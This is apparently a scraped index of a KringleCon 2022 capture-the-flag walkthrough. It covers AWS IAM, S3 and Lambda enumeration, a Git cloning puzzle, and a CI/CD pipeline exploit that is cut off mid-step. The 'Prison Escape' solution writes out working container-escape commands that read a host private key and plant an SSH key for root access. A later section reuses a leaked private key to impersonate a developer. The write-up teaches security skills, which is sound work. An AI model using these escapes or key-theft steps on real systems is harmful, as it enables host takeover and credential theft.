https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html Hint: it is NOT list-attached-user-policies. Answer elf@b6671ab1b76b:~$ aws iam list-user-policies --user-name haug { \"PolicyNames\": [ \"S3Perms\" ], \"IsTruncated\": false } elf@b6671ab1b76b:~$ Now, use the AWS CLI to get the only inline policy for your user. The aws iam command to get a user policy can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html Answer elf@b6671ab1b76b:~$ aws iam list-user-policies --user-name haug { \"PolicyNames\": [ \"S3Perms\" ], \"IsTruncated\": false } elf@b6671ab1b76b:~$ aws iam get-user-policy --user-name haug --policy-name S3Perms { \"UserPolicy\": { \"UserName\": \"haug\", \"PolicyName\": \"S3Perms\", \"PolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Action\": [ \"s3:ListObjects\" ], \"Resource\": [ \"arn:aws:s3:::smogmachines3\", \"arn:aws:s3:::smogmachines3/*\" ] } ] } }, \"IsTruncated\": false } elf@b6671ab1b76b:~$ The inline user policy named S3Perms disclosed the name of an S3 bucket that you have permissions to list objects. List those objects! The aws s3api command to list objects in an s3 bucket can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/s3api/index.html Answer elf@b6671ab1b76b:~$ aws s3api list-objects --bucket smogmachines3 { \"IsTruncated\": false, \"Marker\": \"\", \"Contents\": [ { \"Key\": \"coal-fired-power-station.jpg\", \"LastModified\": \"2022-09-23 20:40:44+00:00\", \"ETag\": \"\\\"1c70c98bebaf3cff781a8fd3141c2945\\\"\", \"Size\": 59312, \"StorageClass\": \"STANDARD\", \"Owner\": { \"DisplayName\": \"grinchum\", \"ID\": \"15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60\" } }, { \"Key\": \"industry-smog.png\", \"LastModified\": \"2022-09-23 20:40:47+00:00\", \"ETag\": \"\\\"c0abe5cb56b7a33d39e17f430755e615\\\"\", \"Size\": 272528, \"StorageClass\": \"STANDARD\", \"Owner\": { \"DisplayName\": \"grinchum\", \"ID\": \"15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60\" } }, { \"Key\": \"pollution-smoke.jpg\", \"LastModified\": \"2022-09-23 20:40:43+00:00\", \"ETag\": \"\\\"465b675c70d73027e13ffaec1a38beec\\\"\", \"Size\": 33064, \"StorageClass\": \"STANDARD\", \"Owner\": { \"DisplayName\": \"grinchum\", \"ID\": \"15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60\" } }, { \"Key\": \"pollution.jpg\", \"LastModified\": \"2022-09-23 20:40:45+00:00\", \"ETag\": \"\\\"d40d1db228c9a9b544b4c552df712478\\\"\", \"Size\": 81775, \"StorageClass\": \"STANDARD\", \"Owner\": { \"DisplayName\": \"grinchum\", \"ID\": \"15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60\" } }, { \"Key\": \"power-station-smoke.jpg\", \"LastModified\": \"2022-09-23 20:40:48+00:00\", \"ETag\": \"\\\"2d7a8c8b8f5786103769e98afacf57de\\\"\", \"Size\": 45264, \"StorageClass\": \"STANDARD\", \"Owner\": { \"DisplayName\": \"grinchum\", \"ID\": \"15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60\" } }, { \"Key\": \"smog-power-station.jpg\", \"LastModified\": \"2022-09-23 20:40:46+00:00\", \"ETag\": \"\\\"0e69b8d53d97db0db9f7de8663e9ec09\\\"\", \"Size\": 32498, \"StorageClass\": \"STANDARD\", \"Owner\": { \"DisplayName\": \"grinchum\", \"ID\": \"15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60\" } }, { \"Key\": \"smogmachine_lambda_handler_qyJZcqvKOthRMgVrAJqq.py\", \"LastModified\": \"2022-09-26 16:31:33+00:00\", \"ETag\": \"\\\"fd5d6ab630691dfe56a3fc2fcfb68763\\\"\", \"Size\": 5823, \"StorageClass\": \"STANDARD\", \"Owner\": { \"DisplayName\": \"grinchum\", \"ID\": \"15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60\" } } ], \"Name\": \"smogmachines3\", \"Prefix\": \"\", \"MaxKeys\": 1000, \"EncodingType\": \"url\" } elf@b6671ab1b76b:~$ The attached user policy provided you several Lambda privileges. Use the AWS CLI to list Lambda functions. The aws lambda command to list functions can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/index.html Answer elf@b6671ab1b76b:~$ aws lambda list-functions { \"Functions\": [ { \"FunctionName\": \"smogmachine_lambda\", \"FunctionArn\": \"arn:aws:lambda:us-east-1:602123424321:function:smogmachine_lambda\", \"Runtime\": \"python3.9\", \"Role\": \"arn:aws:iam::602123424321:role/smogmachine_lambda\", \"Handler\": \"handler.lambda_handler\", \"CodeSize\": 2126, \"Description\": \"\", \"Timeout\": 600, \"MemorySize\": 256, \"LastModified\": \"2022-09-07T19:28:23.634+0000\", \"CodeSha256\": \"GFnsIZfgFNA1JZP3TgTI0tIavOpDLiYlg7oziWbtRsa=\", \"Version\": \"$LATEST\", \"VpcConfig\": { \"SubnetIds\": [ \"subnet-8c80a9cb8b3fa5505\" ], \"SecurityGroupIds\": [ \"sg-b51a01f5b4711c95c\" ], \"VpcId\": \"vpc-85ea8596648f35e00\" }, \"Environment\": { \"Variables\": { \"LAMBDASECRET\": \"975ceab170d61c75\", \"LOCALMNTPOINT\": \"/mnt/smogmachine_files\" } }, \"TracingConfig\": { \"Mode\": \"PassThrough\" }, \"RevisionId\": \"7e198c3c-d4ea-48dd-9370-e5238e9ce06e\", \"FileSystemConfigs\": [ { \"Arn\": \"arn:aws:elasticfilesystem:us-east-1:602123424321:access-point/fsap- db3277b03c6e975d2\", \"LocalMountPath\": \"/mnt/smogmachine_files\" } ], \"PackageType\": \"Zip\", \"Architectures\": [ \"x86_64\" ], \"EphemeralStorage\": { \"Size\": 512 } } ] } elf@b6671ab1b76b:~$ Lambda functions can have public URLs from which they are directly accessible. Use the AWS CLI to get the configuration containing the public URL of the Lambda function. The aws lambda command to get the function URL config can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/index.html Answer elf@b6671ab1b76b:~$ aws lambda get-function-url-config --function-name smogmachine_lambda { \"FunctionUrl\": \"https://rxgnav37qmvqxtaksslw5vwwjm0suhwc.lambda-url.us-east-1.on.aws/\", \"FunctionArn\": \"arn:aws:lambda:us-east-1:602123424321:function:smogmachine_lambda\", \"AuthType\": \"AWS_IAM\", \"Cors\": { \"AllowCredentials\": false, \"AllowHeaders\": [], \"AllowMethods\": [ \"GET\", \"POST\" ], \"AllowOrigins\": [ \"*\" ], \"ExposeHeaders\": [], \"MaxAge\": 0 }, \"CreationTime\": \"2022-09-07T19:28:23.808713Z\", \"LastModifiedTime\": \"2022-09-07T19:28:23.808713Z\" } elf@b6671ab1b76b:~$","title":"Solution"},{"location":"quests/Recover_the_Cloud_Ring/13_Exploitation_via_AWS_CLI/#completion","text":"Sulfrod Ha! Now I have the ring! This computer stuff sure is easy if you just make someone do it for you. Wait.. the computer gave you the ring? Gah, whatever. This never happened, got it? Now beat it, nerd!","title":"Completion"},{"location":"quests/Recover_the_Elfen_Ring/","text":"Recover the Elfen Ring This quest line takes place on the third level of the subterranean labyrinth and consists of 3 objectives. Clone with a Difference Prison Escape Jolly CI/CD","title":"Recover the Elfen Ring"},{"location":"quests/Recover_the_Elfen_Ring/#recover-the-elfen-ring","text":"This quest line takes place on the third level of the subterranean labyrinth and consists of 3 objectives. Clone with a Difference Prison Escape Jolly CI/CD","title":"Recover the Elfen Ring"},{"location":"quests/Recover_the_Elfen_Ring/05_Clone_with_a_Difference/","text":"Clone with a Difference Clone with a Difference Difficulty : Clone a code repository. Get hints for this challenge from Bow Ninecandle in the Elfen Ring. Elf Introduction Talk to Bow Ninecandle Well hello! I'm Bow Ninecandle! Have you ever used Git before? It's so neat! It adds so much convenience to DevOps, like those times when a new person joins the team. They can just clone the project, and start helping out right away! Speaking of, maybe you could help me out with cloning this repo? I've heard there's multiple methods, but I only know how to do one. If you need more help, check out the panel of very senior DevOps experts . Hints and Resources Hints from Bow Ninecandle's introduction HTTPS Git Cloning There's a consistent format for Github repositories cloned via HTTPS . Try converting! Solution Open the terminal next to Bow Ninecandle The terminal tells us that the git command to clone the repository, git clone git@haugfactory.com:asnowball/aws_scripts.git isn't working. Git repositories can typically be accessed either by SSH (if authenticated) or HTTPS (if public). The format the terminal shows us is for SSH. Format Syntax SSH git@<server>:<user>/<repo> HTTPS https://<server>/<user>/<repo> Using the HTTPS format for the repository allows us to clone it, then we just need to examine the README.md file to find the last word in it, then runtoanswer to submit the answer. git clone https://haugfactory.com/asnowball/aws_scripts cat aws_scripts/README.md runtoanswer What's the last word in the README.md file for the aws_scripts repo? maintainers Completion Talk to Bow Ninecastle Wow - great work! Thank you! Say, if you happen to be testing containers for security, there are some things you should think about. Developers love to give ALL TeH PERMz so that things \"just work,\" but it can cause real problems. It's always smart to check for excessive user and container permissions. You never know! You might be able to interact with host processes or filesystems!","title":"Clone with a Difference"},{"location":"quests/Recover_the_Elfen_Ring/05_Clone_with_a_Difference/#clone-with-a-difference","text":"Clone with a Difference Difficulty : Clone a code repository. Get hints for this challenge from Bow Ninecandle in the Elfen Ring.","title":"Clone with a Difference"},{"location":"quests/Recover_the_Elfen_Ring/05_Clone_with_a_Difference/#elf-introduction","text":"Talk to Bow Ninecandle Well hello! I'm Bow Ninecandle! Have you ever used Git before? It's so neat! It adds so much convenience to DevOps, like those times when a new person joins the team. They can just clone the project, and start helping out right away! Speaking of, maybe you could help me out with cloning this repo? I've heard there's multiple methods, but I only know how to do one. If you need more help, check out the panel of very senior DevOps experts .","title":"Elf Introduction"},{"location":"quests/Recover_the_Elfen_Ring/05_Clone_with_a_Difference/#hints-and-resources","text":"Hints from Bow Ninecandle's introduction HTTPS Git Cloning There's a consistent format for Github repositories cloned via HTTPS . Try converting!","title":"Hints and Resources"},{"location":"quests/Recover_the_Elfen_Ring/05_Clone_with_a_Difference/#solution","text":"Open the terminal next to Bow Ninecandle The terminal tells us that the git command to clone the repository, git clone git@haugfactory.com:asnowball/aws_scripts.git isn't working. Git repositories can typically be accessed either by SSH (if authenticated) or HTTPS (if public). The format the terminal shows us is for SSH. Format Syntax SSH git@<server>:<user>/<repo> HTTPS https://<server>/<user>/<repo> Using the HTTPS format for the repository allows us to clone it, then we just need to examine the README.md file to find the last word in it, then runtoanswer to submit the answer. git clone https://haugfactory.com/asnowball/aws_scripts cat aws_scripts/README.md runtoanswer What's the last word in the README.md file for the aws_scripts repo? maintainers","title":"Solution"},{"location":"quests/Recover_the_Elfen_Ring/05_Clone_with_a_Difference/#completion","text":"Talk to Bow Ninecastle Wow - great work! Thank you! Say, if you happen to be testing containers for security, there are some things you should think about. Developers love to give ALL TeH PERMz so that things \"just work,\" but it can cause real problems. It's always smart to check for excessive user and container permissions. You never know! You might be able to interact with host processes or filesystems!","title":"Completion"},{"location":"quests/Recover_the_Elfen_Ring/06_Prison_Escape/","text":"Prison Escape Prison Escape Difficulty : Escape from a container. Get hints for this challenge from Bow Ninecandle in the Elfen Ring. What hex string appears in the host file /home/jailer/.ssh/jail.key.priv? Elf Introduction Talk to Tinsel Upatree Hiya hiya, I'm Tinsel Upatree! Check me out, I'm working side-by-side with a real-life Flobbit. Epic! Anyway, would ya' mind looking at this terminal with me? It takes a few seconds to start up, but then you're logged into a super secure container environment! Or maybe it isn't so secure? I've heard about container escapes, and it has me a tad worried. Do you think you could test this one for me? I'd appreciate it! Hints and Resources Hints from Bow Ninecastle after completing the Clone with a Difference objective Over-Permissioned When users are over-privileged, they can often act as root. When containers have too many permissions , they can affect the host! Mount Up and Ride Were you able to mount up? If so, users' home/ directories can be a great place to look for secrets... Other Resources Jared Folkins, DevOps Faux Paws | KringleCon 2022 https://www.youtube.com/watch?v=vIQY_FH1SVk&list=PLjLd1hNA7YVy9Xd1pRtE_TKWdzsnkHcqQ&index=11 Understanding Docker Container Escapes https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/ Solution Open the terminal next to Tinsel Upatree. The terminal introduction infers that we are running in a container, but we can verify this with the following command cat /proc/1/cgroup Next, we should see what privileges we have. sudo -l This command reveals that we have full sudo rights, so we will start a shell as root to use from here on sudo sh Next, we need to determine if we are running in a privileged container. There are several ways to do this, including seeing if we have visibility to devices, having access to disk devices, or if we can create an IP link without throwing an error. ls /dev fdisk -l ip link add dummy0 type dummy Now that we know we are in a privileged container we can create our escape using the Notify on Release technique. There are several ways to setup this escape, but all rely on causing the host to execute a command as root. The first method, which is what I initially used, creates a Linux control group and a command that will execute when the last task of the group completes. The second technique, as described in the hint from Bow Ninecastle, creates a command that runs when a new device is mounted. Both of these will achieve the same results, which is execution of the /cmd file. cgroup method device method mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x echo 1 > /tmp/cgrp/x/notify_on_release host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab` echo \"$host_path/cmd\" > /tmp/cgrp/release_agent After this, running the following command will cause the /cmd file to run on the host sh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab` echo $host_path/cmd > /sys/kernel/uevent_helper After this, running the following command will cause the /cmd file to run on the host echo change > /sys/class/mem/null/uevent Now we need to compose our /cmd file. Again, there are multiple ways to achieve this objective. The simple way, since we know the name of the file that we want to access, is to just copy the contents of the target file into an output file that we can access. A more complex method, but one that gives full shell access, is to use the command to add an ssh public key into the root user's list of authorized keys, then simply ssh to the host machine. Conveniently for us, the host machine contains a script at the root called keygen.sh that will generate a public / private key pair. Retrieve target directly Pop shell echo \"#!/bin/sh\" > /cmd echo \"cat /home/jailer/.ssh/jail.key.priv > $host_path/output\" >> /cmd chmod +x /cmd Execute the escape with whichever command will do so and then inspect the contents of /output cat /output First, create the public / private key cd /root mkdir .ssh cd .ssh /keygen.sh After generating the key, copy the private key into the buffer, use an editor to create a file named id_rsa, and set the permissions on the file nano id_rsa <paste the text of the private key and save> chmod 600 id_rsa Now create the /cmd file echo \"#!/bin/sh\" > /cmd echo \"echo '<paste public key here>' >> /root/.ssh/authorized_keys\" >> /cmd echo \"cat /root/.ssh/authorized_keys > $host_path/output\" >> /cmd Execute the script with whichever command will do so and then ssh to the host to get full shell ssh 172.17.0.1 cat /home/jailer/.ssh/jail.key.priv Answer 082bb339ec19de4935867 Completion Talk to Tinsel Upatree Great! Thanks so much for your help! Now that you've helped me with this, I have time to tell you about the deployment tech I've been working on! Continuous Integration/Continuous Deployment pipelines allow developers to iterate and innovate quickly. With this project, once I push a commit, a GitLab runner will automatically deploy the changes to production. WHOOPS! I didn\u2019t mean to commit that to http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git... Unfortunately, if attackers can get in that pipeline, they can make an awful mess of things!","title":"Prison Escape"},{"location":"quests/Recover_the_Elfen_Ring/06_Prison_Escape/#prison-escape","text":"Prison Escape Difficulty : Escape from a container. Get hints for this challenge from Bow Ninecandle in the Elfen Ring. What hex string appears in the host file /home/jailer/.ssh/jail.key.priv?","title":"Prison Escape"},{"location":"quests/Recover_the_Elfen_Ring/06_Prison_Escape/#elf-introduction","text":"Talk to Tinsel Upatree Hiya hiya, I'm Tinsel Upatree! Check me out, I'm working side-by-side with a real-life Flobbit. Epic! Anyway, would ya' mind looking at this terminal with me? It takes a few seconds to start up, but then you're logged into a super secure container environment! Or maybe it isn't so secure? I've heard about container escapes, and it has me a tad worried. Do you think you could test this one for me? I'd appreciate it!","title":"Elf Introduction"},{"location":"quests/Recover_the_Elfen_Ring/06_Prison_Escape/#hints-and-resources","text":"Hints from Bow Ninecastle after completing the Clone with a Difference objective Over-Permissioned When users are over-privileged, they can often act as root. When containers have too many permissions , they can affect the host! Mount Up and Ride Were you able to mount up? If so, users' home/ directories can be a great place to look for secrets... Other Resources Jared Folkins, DevOps Faux Paws | KringleCon 2022 https://www.youtube.com/watch?v=vIQY_FH1SVk&list=PLjLd1hNA7YVy9Xd1pRtE_TKWdzsnkHcqQ&index=11 Understanding Docker Container Escapes https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/","title":"Hints and Resources"},{"location":"quests/Recover_the_Elfen_Ring/06_Prison_Escape/#solution","text":"Open the terminal next to Tinsel Upatree. The terminal introduction infers that we are running in a container, but we can verify this with the following command cat /proc/1/cgroup Next, we should see what privileges we have. sudo -l This command reveals that we have full sudo rights, so we will start a shell as root to use from here on sudo sh Next, we need to determine if we are running in a privileged container. There are several ways to do this, including seeing if we have visibility to devices, having access to disk devices, or if we can create an IP link without throwing an error. ls /dev fdisk -l ip link add dummy0 type dummy Now that we know we are in a privileged container we can create our escape using the Notify on Release technique. There are several ways to setup this escape, but all rely on causing the host to execute a command as root. The first method, which is what I initially used, creates a Linux control group and a command that will execute when the last task of the group completes. The second technique, as described in the hint from Bow Ninecastle, creates a command that runs when a new device is mounted. Both of these will achieve the same results, which is execution of the /cmd file. cgroup method device method mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x echo 1 > /tmp/cgrp/x/notify_on_release host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab` echo \"$host_path/cmd\" > /tmp/cgrp/release_agent After this, running the following command will cause the /cmd file to run on the host sh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab` echo $host_path/cmd > /sys/kernel/uevent_helper After this, running the following command will cause the /cmd file to run on the host echo change > /sys/class/mem/null/uevent Now we need to compose our /cmd file. Again, there are multiple ways to achieve this objective. The simple way, since we know the name of the file that we want to access, is to just copy the contents of the target file into an output file that we can access. A more complex method, but one that gives full shell access, is to use the command to add an ssh public key into the root user's list of authorized keys, then simply ssh to the host machine. Conveniently for us, the host machine contains a script at the root called keygen.sh that will generate a public / private key pair. Retrieve target directly Pop shell echo \"#!/bin/sh\" > /cmd echo \"cat /home/jailer/.ssh/jail.key.priv > $host_path/output\" >> /cmd chmod +x /cmd Execute the escape with whichever command will do so and then inspect the contents of /output cat /output First, create the public / private key cd /root mkdir .ssh cd .ssh /keygen.sh After generating the key, copy the private key into the buffer, use an editor to create a file named id_rsa, and set the permissions on the file nano id_rsa <paste the text of the private key and save> chmod 600 id_rsa Now create the /cmd file echo \"#!/bin/sh\" > /cmd echo \"echo '<paste public key here>' >> /root/.ssh/authorized_keys\" >> /cmd echo \"cat /root/.ssh/authorized_keys > $host_path/output\" >> /cmd Execute the script with whichever command will do so and then ssh to the host to get full shell ssh 172.17.0.1 cat /home/jailer/.ssh/jail.key.priv Answer 082bb339ec19de4935867","title":"Solution"},{"location":"quests/Recover_the_Elfen_Ring/06_Prison_Escape/#completion","text":"Talk to Tinsel Upatree Great! Thanks so much for your help! Now that you've helped me with this, I have time to tell you about the deployment tech I've been working on! Continuous Integration/Continuous Deployment pipelines allow developers to iterate and innovate quickly. With this project, once I push a commit, a GitLab runner will automatically deploy the changes to production. WHOOPS! I didn\u2019t mean to commit that to http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git... Unfortunately, if attackers can get in that pipeline, they can make an awful mess of things!","title":"Completion"},{"location":"quests/Recover_the_Elfen_Ring/07_Jolly_CICD/","text":"Jolly CI/CD Jolly CI/CD Difficulty : Exploit a CI/CD pipeline. Get hints for this challenge from Tinsel Upatree in the Elfen Ring Note that this objective is not available until Prison Escape is completed. Elf Introduction Talk to Rippin Proudboot Yes, hello, I'm Rippin Proudboot. Can I help you? Oh, you'd like to help me? Well, I'm not quite sure you can, but we shall see. The elves here introduced me to this new CI/CD technology. It seems quite efficient. Unfortunately, the sporcs seem to have gotten their grubby mits on it as well, along with the Elfen Ring. They've used CI/CD to launch a website, and the Elfen Ring to power it. Might you be able to check for any misconfigurations or vulnerabilities in their CI/CD pipeline? If you do find anything, use it to exploit the website, and get the ring back! Hints and Resources Hints from Tinsel Upatree after completing the Prison Escape objective Commiting to Mistakes The thing about Git is that every step of development is accessible \u2013 even steps you didn't mean to take! git log can show code skeletons. Switching Hats If you find a way to impersonate another identity, you might try re-cloning a repo with their credentials. Other resources Rajvi Khanjan Shroff, Xmas Scanning with Nmap | KringleCon 2022 https://www.youtube.com/watch?v=O1vc5yDUeiE&list=PLjLd1hNA7YVy9Xd1pRtE_TKWdzsnkHcqQ&index=6&t=8s Jared Folkins, DevOps Faux Paws | KringleCon 2022 https://www.youtube.com/watch?v=vIQY_FH1SVk&list=PLjLd1hNA7YVy9Xd1pRtE_TKWdzsnkHcqQ&index=11 w3m https://w3m.sourceforge.net/MANUAL Git docs https://git-scm.com/docs Solution Recon Before we start, let's first determine our own IP address ifconfig grinchum-land:~$ ifconfig eth0 Link encap:Ethernet HWaddr 02:42:AC:12:00:63 inet addr:172.18.0.99 Bcast:172.18.255.255 Mask:255.255.0.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:363 errors:0 dropped:0 overruns:0 frame:0 TX packets:252 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:30667 (29.9 KiB) TX bytes:36653 (35.7 KiB) lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:7 errors:0 dropped:0 overruns:0 frame:0 TX packets:7 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:389 (389.0 B) TX bytes:389 (389.0 B) Now perform an nmap scan of our local network segment nmap -p1-65535 172.18.0.0/24 grinchum-land:~$ nmap -p1-65535 172.18.0.0/24 Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-10 22:40 GMT Nmap scan report for 172.18.0.1 Host is up (0.00042s latency). Not shown: 65529 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 2222/tcp open EtherNetIP-1 8080/tcp open http-proxy 8088/tcp open radan-http 10022/tcp open unknown Nmap scan report for wordpress-db.local_docker_network (172.18.0.87) Host is up (0.00043s latency). Not shown: 65534 closed tcp ports (conn-refused) PORT STATE SERVICE 3306/tcp open mysql Nmap scan report for wordpress.local_docker_network (172.18.0.88) Host is up (0.00052s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap scan report for grinchum-land.flag.net.internal (172.18.0.99) Host is up (0.00012s latency). Not shown: 65534 closed tcp ports (conn-refused) PORT STATE SERVICE 2222/tcp open EtherNetIP-1 Nmap scan report for gitlab.local_docker_network (172.18.0.150) Host is up (0.00012s latency). Not shown: 65532 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8181/tcp open intermapper Nmap done: 256 IP addresses (5 hosts up) scanned in 10.99 seconds Get the Code Presumably the code is stored on the gitlab server, and a CI/CD pipeline copies it to the wordpress site when changes are made. In order to get a copy of the code to investigate, further, we first need to find it. Use w3m to connect to the site w3m gitlab.local_docker_network GitLab Logo GitLab Username or email [ ] Password [ ] [ ] Remember me Forgot your password? Sign in By signing in you accept the Terms of Use and acknowledge the Privacy Policy and Cookie Policy. Don't have an account yet? Register now \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501 Explore Help About GitLab Community forum Follow the Explore link Skip to content GitLab \u2022 Projects Groups Snippets \u2022 [ ] / \u2022 \u2022 Help \u25a1 Help \u25a1 Support \u25a1 Community forum \u25a1 Keyboard shortcuts ? \u25a1 \u25a1 Submit feedback \u25a1 Contribute to GitLab \u2022 Sign in / Register Toggle navigation Menu Explore GitLab Discover projects, groups and snippets. Share your projects with others \u2022 All \u2022 Most stars \u2022 Trending [ ] Updated date \u2022 Sort by \u2022 Updated date \u2022 Last created \u2022 Name \u2022 Name, descending \u2022 Most stars \u2022 Oldest updated \u2022 Oldest created \u2022 \u2022 Hide archived projects \u2022 Show archived projects \u2022 Show archived projects only \u2022 W Rings of Powder / Wordpress.Flag.Net.Internal 0 0 0 0 Updated Oct 27, 2022 Follow the Rings of Powder link At the bottom of the page are references to the SSH and HTTP links to the repository Copy HTTP clone URL \u2022 Copy SSH clone URLssh://git@gitlab.flag.net.internal:10022/rings-of-powder/wordpress.flag.net.internal.git \u2022 Copy HTTP clone URLhttp://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git Clone the repo using the http link $ git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git Examine the commit history Now that we have a copy of the repository, search the commit history for anything interesting. $ cd wordpress.flag.net.internal $ git log commit 37b5d575bf81878934adb937a4fff0d32a8da105 (HEAD -> main, origin/main, origin/HEAD) Author: knee-oh <sporx@kringlecon.com> Date: Wed Oct 26 13:58:15 2022 -0700 updated wp-config commit a59cfe83522c9aeff80d49a0be2226f4799ed239 Author: knee-oh <sporx@kringlecon.com> Date: Wed Oct 26 12:41:05 2022 -0700 update gitlab.ci.yml commit a968d32c0b58fd64744f8698cbdb60a97ec604ed Author: knee-oh <sporx@kringlecon.com> Date: Tue Oct 25 16:43:48 2022 -0700 test commit 7093aad279fc4b57f13884cf162f7d80f744eea5 Author: knee-oh <sporx@kringlecon.com> Date: Tue Oct 25 15:08:14 2022 -0700 add gitlab-ci commit e2208e4bae4d41d939ef21885f13ea8286b24f05 Author: knee-oh <sporx@kringlecon.com> Date: Tue Oct 25 13:43:53 2022 -0700 big update commit e19f653bde9ea3de6af21a587e41e7a909db1ca5 Author: knee-oh <sporx@kringlecon.com> Date: Tue Oct 25 13:42:54 2022 -0700 whoops commit abdea0ebb21b156c01f7533cea3b895c26198c98 Author: knee-oh <sporx@kringlecon.com> Date: Tue Oct 25 13:42:13 2022 -0700 added assets commit a7d8f4de0c594a0bbfc963bf64ab8ac8a2f166ca Author: knee-oh <sporx@kringlecon.com> Date: Mon Oct 24 17:32:07 2022 -0700 init commit Any commit with the name 'whoops' requires further investigation $ git show e19f653bde9ea3de6af21a587e41e7a909db1ca5 commit e19f653bde9ea3de6af21a587e41e7a909db1ca5 Author: knee-oh <sporx@kringlecon.com> Date: Tue Oct 25 13:42:54 2022 -0700 whoops diff --git a/.ssh/.deploy b/.ssh/.deploy deleted file mode 100644 index 3f7a9e3..0000000 --- a/.ssh/.deploy +++ /dev/null @@ -1,7 +0,0 @@ ------BEGIN OPENSSH PRIVATE KEY----- -b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW -QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5 -9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g -AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot -PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ== ------END OPENSSH PRIVATE KEY----- diff --git a/.ssh/.deploy.pub b/.ssh/.deploy.pub deleted file mode 100644 index 8c0b43c..0000000 --- a/.ssh/.deploy.pub +++ /dev/null @@ -1 +0,0 @@ -ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP7AsdI7HOvk4piOcwLZfDotPqBj2tDq9NBdTUkbZBri sporx@kringlecon.com In this commit we see that the developer removed a public key that had been inadvertently included. Impersonate knee-oh From the content of the public key in the git commit history we see that this is an ed25519 key. Copy this content into our own key file, remembering to remove the leading - from each line out of the commit history. $ cd ~ $ mkdir .ssh $ nano .ssh/id_ed25519 <paste the contents of the private key> $ chmod 600 .ssh/id_ed25519 Before we can re-clone the repository, we need to also set our username and email properties in git to impersonate knee-oh $ git config --global user.email \"sporx@kringlecon.com\" $ git config --global user.name \"knee-oh\" Now we need to re-clone the repository using ssh. Looking back at the ssh URL we see that it is ssh://git@gitlab.flag.net.internal:10022/rings-of-powder/wordpress.flag.net.internal.git , but referring back to the nmap scan there is no port 10022 listening on the gitlab server. There is however a port 10022 listening on the machine at IP address 172.18.0.1, so try that instead. $ cd ~ $ rm -rf wordpress.flag.net.internal $ git clone ssh://git@172.18.0.1:10022/rings-of-powder/wordpress.flag.net.internal.git Now that we have connected as an authenticated user, we can commit and push changes back to the repo. Exploit the CI/CD pipline The CI/CD pipeline is defined by the .gitlab-ci.yml file 